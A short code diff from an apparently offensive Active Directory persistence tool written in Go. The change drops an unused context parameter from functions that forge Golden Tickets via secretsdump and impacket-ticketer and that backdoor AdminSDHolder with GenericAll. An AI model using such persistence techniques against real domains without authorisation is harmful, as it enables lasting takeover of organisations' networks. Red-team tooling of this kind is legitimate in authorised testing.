@@ -56,10 +56,10 @@ func RunPersistence(state *core.ADState, targetHost string) *core.ToolResult {
 		deployed++
 	}
 	if host.IsDC {
-		if deployGoldenTicket(ctx, host, domain, user, pass, hash, result, state) {
+		if deployGoldenTicket(host, domain, user, pass, hash, result, state) {
 			deployed++
 		}
-		if deployAdminSDHolder(ctx, host, domain, user, pass, hash, result) {
+		if deployAdminSDHolder(host, domain, user, pass, hash, result) {
 			deployed++
 		}
 		flagSkeletonKeyOpportunity(host, result)
@@ -146,8 +146,7 @@ func deployDSRM(ctx context.Context, exec core.Executor, host core.Host, result 
 //     operator can KRB5CCNAME it for follow-on commands.
 //
 // This requires DA-level creds (already enforced upstream by validation phase).
-func deployGoldenTicket(ctx context.Context, host core.Host, domain, user, pass, hash string, result *core.ToolResult, state *core.ADState) bool {
-	_ = ctx
+func deployGoldenTicket(host core.Host, domain, user, pass, hash string, result *core.ToolResult, state *core.ADState) bool {
 	fmt.Println("[*] Forging Golden Ticket (secretsdump krbtgt → impacket-ticketer)...")
 
 	if _, err := utils.FindTool("impacket-secretsdump"); err != nil {
@@ -439,8 +438,7 @@ func deploySilverTickets(state *core.ADState, host core.Host, domain, user, pass
 //
 // Tries impacket-dacledit (modern, native) first; falls back to bloodyAD which
 // many red teamers have installed. Both are LDAP operations — no shell needed.
-func deployAdminSDHolder(ctx context.Context, host core.Host, domain, user, pass, hash string, result *core.ToolResult) bool {
-	_ = ctx
+func deployAdminSDHolder(host core.Host, domain, user, pass, hash string, result *core.ToolResult) bool {
 	fmt.Println("[*] Backdooring AdminSDHolder (GenericAll → SDProp propagation)...")
 
 	// We grant the existing admin user GenericAll on AdminSDHolder. The principal
